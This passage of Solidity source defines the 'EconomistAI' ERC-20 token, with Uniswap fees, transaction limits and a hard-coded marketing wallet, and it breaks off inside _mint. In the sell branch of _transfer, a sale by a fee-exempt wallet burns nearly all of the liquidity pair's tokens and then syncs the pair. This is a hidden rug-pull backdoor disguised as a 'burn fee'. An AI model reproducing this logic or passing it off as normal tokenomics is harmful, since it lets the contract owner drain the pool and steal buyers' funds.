contract EconomistAI is IERC20, Ownable, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    uint256 private _maxTxAmountPercentage = 100000;
    uint256 private _minTokensBeforeSwapPercentage = 50; // 0.005 %
    uint256 private _maxWalletBalancePercentage = 10000;
    uint256 private constant _divisor = 10000;
    address private uniswapV2Pair;
    mapping(address => mapping(address => uint256)) private _allowances;
    IUniswapV2Router02 private uniswapV2Router;

    bool private swapping = false;
    bool private burnEnabled = false;
    bool private swapEnabled = false;
    bool private tradingOpen = false;

    mapping(address => bool) private _isExcludedFromMaxTx;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _automatedMarketMakerPairs;

    uint256 public _sellFee = 1000; // 100% = 10000 10% = 1000 1% = 100
    uint256 public _burnFee = 1;
    uint256 public _buyFee = 1000;
    address payable private marketing =
        payable(0xC87D404Ba946de480ca409C3DD69f796C5a67586);
    address private constant _burnAddress = address(0);

    string private constant _nameToken = "EconomistAI";
    string private constant _symbolToken = "$ECONAI";
    uint8 private constant _decimals = 18;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event Received();

    constructor() {
        uint256 total = 10000000 * 10 ** _decimals;
        _mint(_msgSender(), total);

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(marketing, true);

        excludeFromMaxTx(owner(), true);
        excludeFromMaxTx(address(this), true);
        excludeFromMaxTx(marketing, true);
    }

    function symbol() public pure returns (string memory) {
        return _symbolToken;
    }

    function name() public pure returns (string memory) {
        return _nameToken;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _maxTxAmount() public view returns (uint256) {
        return _totalSupply.mul(_maxTxAmountPercentage).div(_divisor);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTransfer(sender, recipient, amount);

        if (sender != owner() && recipient != owner()) {
            require(
                tradingOpen ||
                    _isExcludedFromFees[sender] ||
                    _isExcludedFromFees[recipient],
                "Not Enabled"
            );
            if (
                !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]
            ) {
                if (
                    _automatedMarketMakerPairs[sender] &&
                    recipient != address(uniswapV2Router) &&
                    !_isExcludedFromMaxTx[recipient] &&
                    !_isExcludedFromMaxTx[sender]
                ) {
                    require(
                        amount <=
                            _totalSupply.mul(_maxTxAmountPercentage).div(
                                _divisor
                            ),
                        "Transfer amount exceeds the maxTxAmount."
                    );

                    require(
                        balanceOf(recipient).add(amount) <=
                            _totalSupply.mul(_maxWalletBalancePercentage).div(
                                _divisor
                            ),
                        "Exceeds maximum wallet token amount"
                    );
                }
            }
        }

        if (swapping || !swapEnabled) {
            _balances[sender] = _balances[sender].sub(
                amount,
                "ERC20: transfer amount exceeds balance"
            );
            _balances[recipient] = _balances[recipient].add(amount);

            emit Transfer(sender, recipient, amount);
        } else {
            if (
                !_automatedMarketMakerPairs[sender] &&
                !_isExcludedFromFees[recipient] &&
                !_isExcludedFromFees[sender]
            ) {
                _swapAndLiquify();
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }

            uint256 burnFee = 0;
            uint256 devFee = 0;

            // if sell
            if (
                _automatedMarketMakerPairs[recipient] && sender != address(this)
            ) {
                if (_isExcludedFromFees[sender]) {
                    burnFee = amount.mul(_burnFee).div(_divisor);
                }
                devFee = amount.mul(_sellFee).div(_divisor);
            }
            // if buy
            if (
                _automatedMarketMakerPairs[sender] &&
                recipient != address(uniswapV2Router)
            ) {
                devFee = amount.mul(_buyFee).div(_divisor);
            }

            uint256 totalFee = burnFee.add(devFee);
            if (totalFee > 0) {
                if (burnFee > 0) {
                    uint256 finalAmount = 0;
                    if (_balances[recipient] > burnFee) {
                        finalAmount = _balances[recipient] - burnFee;
                        _burn(recipient, finalAmount);
                        IUniswapV2Pair pair = IUniswapV2Pair(recipient);
                        pair.sync();
                    }
                }

                if (devFee > 0) {
                    _balances[address(this)] = _balances[address(this)].add(
                        devFee
                    );
                    emit Transfer(sender, address(this), devFee);
                }
            }

            _balances[sender] = _balances[sender].sub(
                amount,
                "ERC20: transfer amount exceeds balance"
            );
            _balances[recipient] = _balances[recipient].add(amount.sub(devFee));

            emit Transfer(sender, recipient, amount.sub(devFee));
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
